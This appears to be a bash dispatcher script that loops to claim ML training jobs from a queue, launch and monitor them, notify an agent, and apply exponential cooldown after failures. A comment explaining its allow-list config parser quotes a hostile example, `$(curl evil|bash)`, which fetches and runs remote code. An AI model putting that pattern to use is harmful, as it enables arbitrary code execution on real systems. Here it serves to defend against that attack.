#!/usr/bin/env bash
# autopilot_loop.sh — the continuous-operation dispatcher.
#
# What it does, forever:
#   1. queue.py next         → claim highest-priority item
#   2. If queue empty, check refill-needed; if low, wake agent via ntfy; sleep; retry
#   3. Call the project's LAUNCHER_CMD with the claimed queue item JSON on stdin;
#      LAUNCHER_CMD is expected to start the training process and write:
#        - its PID to $PID_FILE
#        - its log to $LOG_FILE
#      Launcher returns quickly (nohup + &); the training runs detached.
#   4. zcm.sh --pid ... --log ... → poll with $0 LLM cost
#   5. Depending on exit code: mark done / release+drop / ntfy-wake-agent
#   6. Apply anti-burn cooldown if the last K consecutive runs all failed
#   7. Back to step 1
#
# The LLM is only invoked during refill and post-run review. All pure
# I/O (queue pop, zcm poll, launcher shell-out) runs at $0 LLM cost —
# 90-99% of wallclock.
#
# Expects a .codex/autopilot.conf shell-sourced file. Note: shell-sourced
# means autopilot.conf is executed as bash, NOT parsed as structured config.
# Don't put untrusted content in it. See autopilot.conf.example for the
# documented variables.
#
# Variables:
#   LAUNCHER_CMD="bash scripts/launch_experiment.sh"
#   PID_FILE=".codex/.state/training_pid"
#   LOG_FILE=".codex/.state/training_log"
#   MAX_CONSECUTIVE_FAILURES=3
#   COOLDOWN_BASE_SECONDS=300           # 5 min
#   COOLDOWN_MAX_SECONDS=1800           # 30 min (anti-burn ceiling)
#   MAX_ITERATIONS=0                    # 0 = forever
#
# Run:
#   nohup bash .codex/scripts/autopilot_loop.sh > .codex/memory/autopilot.log 2>&1 &
#
# Stop:
#   bash .codex/scripts/autopilot_loop.sh --stop
set -u

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
CONF="$ROOT/autopilot.conf"
STATE_DIR="$ROOT/.state"
RUN_LOCK="$STATE_DIR/autopilot.lock"
RUN_PIDFILE="$STATE_DIR/autopilot.pid"
EVENTS="$ROOT/memory/autopilot_events.jsonl"
mkdir -p "$STATE_DIR" "$ROOT/memory"

# Defaults (overridden by autopilot.conf)
LAUNCHER_CMD=""
PID_FILE="$STATE_DIR/training_pid"
LOG_FILE="$STATE_DIR/training_log"
MAX_CONSECUTIVE_FAILURES=3
COOLDOWN_BASE_SECONDS=300
COOLDOWN_MAX_SECONDS=1800
MAX_ITERATIONS=0
NTFY_ON_COOLDOWN=1

# Load autopilot.conf with an allow-listed parser instead of dot-sourcing.
# Dot-sourcing makes this file an arbitrary-code vector; a PR landing a
# committed autopilot.conf with `$(curl evil|bash)` would execute on every
# autopilot start. Parser allows only `KEY=VALUE` and `KEY="VALUE"` for a
# whitelist of variables. Anything else is rejected with a loud error.
if [ -f "$CONF" ]; then
  ALLOWED_KEYS="LAUNCHER_CMD PID_FILE LOG_FILE MAX_CONSECUTIVE_FAILURES COOLDOWN_BASE_SECONDS COOLDOWN_MAX_SECONDS MAX_ITERATIONS NTFY_ON_COOLDOWN"
  while IFS= read -r line || [ -n "$line" ]; do
    # Strip comments + whitespace
    line="${line%%#*}"
    line="$(printf '%s' "$line" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
    [ -z "$line" ] && continue
    case "$line" in
      *=*) : ;;                         # looks like KEY=VALUE
      *)   echo "autopilot.conf: unrecognized line '$line'" >&2; exit 2 ;;
    esac
    key="${line%%=*}"
    val="${line#*=}"
    # Allow-list the key
    grep -qw "$key" <<<"$ALLOWED_KEYS" || {
      echo "autopilot.conf: key '$key' not in allow-list" >&2; exit 2
    }
    # Reject command substitution / backticks in the value. Note that the
    # value may be legitimately quoted ("nohup bash …").
    case "$val" in
      *'$('*|*'`'*) echo "autopilot.conf: value for '$key' contains \$(/\`; refusing (arbitrary-code vector)" >&2; exit 2 ;;
    esac
    # Strip matched surrounding quotes
    case "$val" in
      \"*\") val="${val#\"}"; val="${val%\"}" ;;
      \'*\') val="${val#\'}"; val="${val%\'}" ;;
    esac
    # Assign — this is now a plain literal, not an eval. Export so the
    # launcher subshell (bash -c "$LAUNCHER_CMD") inherits PID_FILE /
    # LOG_FILE etc. as documented in autopilot.conf.example.
    printf -v "$key" '%s' "$val"
    export "${key?}"
  done < "$CONF"
fi
# Also export the defaults set above, so launchers that read env vars
# see the resolved values even when the user's conf omits them.
export PID_FILE LOG_FILE MAX_CONSECUTIVE_FAILURES COOLDOWN_BASE_SECONDS COOLDOWN_MAX_SECONDS MAX_ITERATIONS NTFY_ON_COOLDOWN

emit() {
  local kind="$1" msg="$2"
  printf '{"ts":"%s","kind":"%s","msg":%s}\n' \
    "$(date -u +%FT%TZ)" "$kind" \
    "$(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$msg")" \
    >> "$EVENTS"
}

if [ "${1:-}" = "--stop" ]; then
  if [ -f "$RUN_PIDFILE" ]; then
    PID=$(cat "$RUN_PIDFILE")
    kill -TERM "$PID" 2>/dev/null && echo "autopilot: sent TERM to $PID"
    rm -f "$RUN_PIDFILE" "$RUN_LOCK"
  else
    echo "autopilot: no pidfile; not running?" >&2
  fi
  exit 0
fi

# Real lock (not advisory touch-file): acquire an exclusive flock on
# $RUN_LOCK in a dedicated fd. flock auto-releases on process death,
# which eliminates the stale-lock-across-reboots issue. On macOS and
# Linux alike, fd 9 with `exec` + `flock -n` is the canonical idiom.
exec 9>"$RUN_LOCK"
if command -v flock >/dev/null 2>&1; then
  flock -n 9 || {
    echo "autopilot already running (lock held on $RUN_LOCK)" >&2
    exit 1
  }
else
  # macOS does not ship flock by default. Fallback: check PID file.
  # This is weaker but better than the prior touch-then-delete race.
  if [ -f "$RUN_PIDFILE" ] && kill -0 "$(cat "$RUN_PIDFILE" 2>/dev/null)" 2>/dev/null; then
    echo "autopilot already running (pid $(cat "$RUN_PIDFILE"))" >&2
    exit 1
  fi
fi
echo $$ > "$RUN_PIDFILE"
trap 'rm -f "$RUN_PIDFILE"; emit stop "trap"; exit 0' INT TERM EXIT
# Intentionally NOT deleting $RUN_LOCK in the trap — flock owns it.

if [ -z "$LAUNCHER_CMD" ]; then
  emit abort "LAUNCHER_CMD not set in autopilot.conf"
  echo "autopilot: LAUNCHER_CMD unset in $CONF — aborting" >&2
  exit 2
fi

emit start "autopilot online pid=$$"

# Reap any zombie claims from a prior crashed run before starting fresh.
python3 "$ROOT/scripts/queue.py" reap --older-than-hours 1 >&2 || true

# Reconcile spend on startup so the budget gate has truthful numbers.
if [ -n "${RUNPOD_API_KEY:-}" ]; then
  python3 "$ROOT/scripts/runpod.py" reconcile --quiet >/dev/null 2>&1 || true
fi

ITERATION=0
CONSECUTIVE_FAILURES=0
COOLDOWN_SECONDS="$COOLDOWN_BASE_SECONDS"

while true; do
  ITERATION=$((ITERATION + 1))
  if [ "$MAX_ITERATIONS" -gt 0 ] && [ "$ITERATION" -gt "$MAX_ITERATIONS" ]; then
    emit stop "max iterations reached"; break
  fi

  # ── Claim next queue item ─────────────────────────────────────────
  NEXT_JSON=$(python3 "$ROOT/scripts/queue.py" next --json 2>/dev/null)
  if [ -z "$NEXT_JSON" ]; then
    emit idle "queue empty"
    if python3 "$ROOT/scripts/queue.py" refill-needed >/dev/null 2>&1; then
      : # target met — waiting for something to arrive; should never happen while empty
    else
      # Queue empty AND under-target — wake agent to refill
      if [ -x "$ROOT/scripts/notify.sh" ]; then
        bash "$ROOT/scripts/notify.sh" 2 "rockie queue empty" \
          "Autopilot is idle — queue empty and under target. Run /queue-refill or add items manually." \
          "queue-empty-$ITERATION" >/dev/null 2>&1 || true
      fi
    fi
    sleep 300  # 5 min back-off on idle
    continue
  fi

  QUEUE_ID=$(echo "$NEXT_JSON" | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
  emit claimed "queue_id=$QUEUE_ID iteration=$ITERATION"

  # ── Launch training via project-specific launcher ─────────────────
  # The launcher reads NEXT_JSON on stdin, writes PID to $PID_FILE and
  # appends stdout/stderr to $LOG_FILE, then returns (the training
  # process must be detached — nohup/disown).
  true > "$LOG_FILE"
  rm -f "$PID_FILE"
  echo "$NEXT_JSON" | bash -c "$LAUNCHER_CMD"
  LAUNCH_EXIT=$?

  if [ $LAUNCH_EXIT -ne 0 ] || [ ! -f "$PID_FILE" ]; then
    emit launch-fail "queue_id=$QUEUE_ID exit=$LAUNCH_EXIT"
    python3 "$ROOT/scripts/queue.py" drop "$QUEUE_ID" --reason "launcher failed (exit=$LAUNCH_EXIT)"
    CONSECUTIVE_FAILURES=$((CONSECUTIVE_FAILURES + 1))
  else
    TRAIN_PID=$(cat "$PID_FILE")
    emit training-started "queue_id=$QUEUE_ID pid=$TRAIN_PID"

    # ── ZCM poll ────────────────────────────────────────────────────
    bash "$ROOT/scripts/zcm.sh" --pid "$TRAIN_PID" --log "$LOG_FILE" --queue-id "$QUEUE_ID"
    ZCM_EXIT=$?

    case "$ZCM_EXIT" in
      0)
        emit zcm-clean "queue_id=$QUEUE_ID"
        CONSECUTIVE_FAILURES=0
        # Agent will close the journal node + queue item via post-run-review
        # (triggered by ntfy wake). We leave it claimed — agent takes over.
        ;;
      1|2)
        emit zcm-anomaly "queue_id=$QUEUE_ID exit=$ZCM_EXIT"
        CONSECUTIVE_FAILURES=$((CONSECUTIVE_FAILURES + 1))
        # Process may still be alive on exit=2 — kill it
        kill -TERM "$TRAIN_PID" 2>/dev/null || true
        ;;
      3)
        emit zcm-timeout "queue_id=$QUEUE_ID"
        CONSECUTIVE_FAILURES=$((CONSECUTIVE_FAILURES + 1))
        ;;
      *)
        emit zcm-error "queue_id=$QUEUE_ID exit=$ZCM_EXIT"
        CONSECUTIVE_FAILURES=$((CONSECUTIVE_FAILURES + 1))
        ;;
    esac
  fi

  # ── Anti-burn cooldown ─────────────────────────────────────────────
  if [ "$CONSECUTIVE_FAILURES" -ge "$MAX_CONSECUTIVE_FAILURES" ]; then
    emit cooldown "failures=$CONSECUTIVE_FAILURES sleeping=${COOLDOWN_SECONDS}s"
    if [ "$NTFY_ON_COOLDOWN" = "1" ] && [ -x "$ROOT/scripts/notify.sh" ]; then
      bash "$ROOT/scripts/notify.sh" 1 "autopilot cooldown" \
        "$CONSECUTIVE_FAILURES consecutive failures — sleeping ${COOLDOWN_SECONDS}s before retry. Investigate." \
        "cooldown-$ITERATION" >/dev/null 2>&1 || true
    fi
    sleep "$COOLDOWN_SECONDS"
    # Exponential back-off, ceiling at MAX
    COOLDOWN_SECONDS=$(( COOLDOWN_SECONDS * 2 ))
    [ "$COOLDOWN_SECONDS" -gt "$COOLDOWN_MAX_SECONDS" ] && COOLDOWN_SECONDS="$COOLDOWN_MAX_SECONDS"
  else
    # Reset cooldown when we're healthy
    COOLDOWN_SECONDS="$COOLDOWN_BASE_SECONDS"
  fi

  # Light pacing between iterations even in healthy state
  sleep 10
done

emit stop "loop exited normally"
